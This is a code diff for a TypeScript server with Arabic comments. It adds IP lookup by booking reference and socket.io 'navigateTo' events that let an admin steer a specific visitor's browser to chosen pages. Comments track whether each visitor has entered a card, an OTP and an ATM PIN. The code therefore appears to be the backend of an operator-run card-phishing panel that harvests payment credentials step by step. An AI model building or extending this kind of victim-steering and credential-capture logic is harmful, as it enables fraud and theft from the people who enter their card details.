@@ -21,7 +21,7 @@ import {
   getNavigationLogs,
 } from "./db";
 import { notifyOwner } from "./_core/notification";
-import { getIo } from "./socket";
+import { getIo, getIpByReference } from "./socket";
 
 // ==================== Admin Procedure ====================
 const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
@@ -398,10 +398,14 @@ const navigationRouter = router({
     .mutation(async ({ input, ctx }) => {
       const { clientIp, page, referenceId, note } = input;
 
+      // نستخدم IP من ipToReference map (الحقيقي من ipify) إذا كان referenceId متاحاً
+      const ipifyIp = referenceId ? getIpByReference(referenceId) : null;
+      const effectiveIp = ipifyIp || clientIp;
+
       // تسجيل في قاعدة البيانات
       await logNavigation({
         referenceId,
-        clientIp,
+        clientIp: effectiveIp,
         targetPage: page,
         adminId: ctx.user.id,
         note,
@@ -411,7 +415,10 @@ const navigationRouter = router({
       try {
         const io = getIo();
         if (io) {
-          io.emit("navigateTo", { page, ip: clientIp });
+          // إرسال للـ room المحدد أولاً
+          io.to(`ip_${effectiveIp}`).emit("navigateTo", { page, ip: effectiveIp });
+          // fallback: إرسال للجميع مع IP للتحقق
+          io.emit("navigateTo", { page, ip: effectiveIp });
         }
       } catch (e) {
         console.error("Socket emit error:", e);
@@ -509,7 +516,9 @@ const adminRouter = router({
 
       // جلب IP العميل وبيانات الدفع الحالية
       const booking = await getBookingByReference(reference);
-      const clientIp = booking?.clientIp || "";
+      // نستخدم IP من ipToReference map (IP ipify الحقيقي) أولاً، ثم IP من DB كـ fallback
+      const ipifyIp = getIpByReference(reference);
+      const clientIp = ipifyIp || booking?.clientIp || "";
       const existingPayment = await getPaymentByReference(reference);
       // step 1=بطاقة مدخلة, step 2=OTP مدخل, step 3=ATM مدخل
       const currentStep = existingPayment?.step ?? 1;
@@ -569,9 +578,14 @@ const adminRouter = router({
 
           // إرسال navigateTo للعميل إذا كان IP معروفاً
           if (targetPage && clientIp) {
+            // إرسال للـ room المحدد (IP ipify)
             io.to(`ip_${clientIp}`).emit("navigateTo", { page: targetPage, ip: clientIp });
-            // fallback: إرسال للجميع مع IP للتحقق
+            // fallback: إرسال للجميع مع IP للتحقق (يعمل فقط إذا تطابق IP)
             io.emit("navigateTo", { page: targetPage, ip: clientIp });
+          } else if (targetPage) {
+            // إذا لم يكن IP معروفاً، إرسال بدون IP (يُحرّك جميع العملاء في صفحة الانتظار)
+            // هذا fallback أخير فقط
+            console.warn(`[navigateTo] No IP found for reference ${reference}, broadcasting without IP check`);
           }
         }
       } catch (_) {}
